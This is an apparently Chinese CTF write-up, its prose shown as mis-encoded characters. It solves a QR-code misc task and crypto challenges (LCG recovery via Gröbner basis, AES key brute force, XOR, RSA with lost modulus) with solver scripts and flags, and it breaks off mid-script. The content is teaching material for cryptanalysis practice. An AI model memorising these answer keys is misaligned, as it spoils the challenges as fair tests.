å¾—åˆ°ï¼š</p><p><code>0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000</code></p><p>37*37çš„01å­—ç¬¦ä¸²ï¼Œè½¬ä¸ºäºŒç»´ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">37</span>))</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">37</span>*i+j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰«ç å¾—flagï¼š<code>flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</code></p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LinearEquations"><a href="#LinearEquations" class="headerlink" title="LinearEquations"></a>LinearEquations</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my_LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed1 , seed2</span>):</span></span><br><span class="line">        self.state = [seed1,seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append( new )</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>),getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main() </span><br><span class="line"></span><br><span class="line"><span class="comment"># data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span></span><br><span class="line"><span class="comment"># n = 10104483468358610819</span></span><br></pre></td></tr></table></figure></blockquote><p>é­”æ”¹ä¸‰å‚æ•°LCGï¼Œåˆ©ç”¨æ»¡è¶³çš„å…¬å¼ $as_{i-1}+bs_{i-2}+c \equiv s_i \pmod n$ï¼Œå¾—åˆ°ä¸‰å…ƒä¸€æ¬¡åŒä½™æ–¹ç¨‹ç»„ï¼Œåˆ©ç”¨GrÃ¶bneråŸºæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">2626199569775466793</span>, <span class="number">8922951687182166500</span>, <span class="number">454458498974504742</span>, <span class="number">7289424376539417914</span>, <span class="number">8673638837300855396</span>]</span><br><span class="line">n = <span class="number">10104483468358610819</span></span><br><span class="line">PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    m += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;L1near_Equ4t1on6_1s_34sy&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ï¼š<code>cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;</code></p><p>â€‹    </p><h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] ==<span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m</span>):</span></span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(m)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,key</span>):</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = pad(flag)</span><br><span class="line">    key = pad(long_to_bytes(random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)))</span><br><span class="line">    c = encrypt(flag,key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>randomèŒƒå›´ä¸å¤§ï¼Œçˆ†ç ´keyè§£AES-ECBï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">x</span>):</span></span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,key</span>):</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">20</span>):</span><br><span class="line">        key = pad(long_to_bytes(i))</span><br><span class="line">        c = <span class="string">b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br><span class="line">        m = decrypt(c,key)</span><br><span class="line">        <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;cazy&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            </span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag,key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>keyä¸º5ä½ï¼Œå·²çŸ¥flagå¤´5ä½ï¼Œä¸å¯†æ–‡å¼‚æˆ–å¾—<code>key = b&#39;\x5f\x11\x32\xff\x61&#39;</code>ï¼Œå†å¼‚æˆ–å¯†æ–‡è¿˜åŸæ˜æ–‡ï¼š</p><p><code>cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</code></p><p>â€‹    </p><h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">80</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sec_encry</span>(<span class="params">m</span>):</span></span><br><span class="line">    cip = (m - (<span class="number">1</span>&lt;&lt;<span class="number">500</span>))**<span class="number">2</span> + <span class="number">0x0338470</span></span><br><span class="line">    <span class="keyword">return</span> cip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = sec_encry(m)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>ç®€å•é€†å›å»å°±å¥½ï¼Œæ³¨æ„ä¸€ä¸‹å¼€æ–¹å–è´Ÿå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line">c -= <span class="number">0x0338470</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = -gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m+(<span class="number">1</span>&lt;&lt;<span class="number">500</span>))[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>æ•°å­¦æœ€é‡è¦çš„å°±æ˜¯æ¨å¯¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pinvq:<span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">qinvp:<span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">c:<span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">e:<span class="number">0x10005</span></span><br><span class="line">d:<span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br></pre></td></tr></table></figure></blockquote><p>ç»™å‡º $x=\text{inv}(p,q),y=\text{inv}(q,p),e,d,c$ã€‚</p><p>è¯¦ç»†æ¨å¯¼æ€è·¯å¯å‚è€ƒ <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">0x10005</span></span><br><span class="line">    <span class="comment">#fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = <span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br><span class="line">    pprime = <span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">    qprime = <span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span 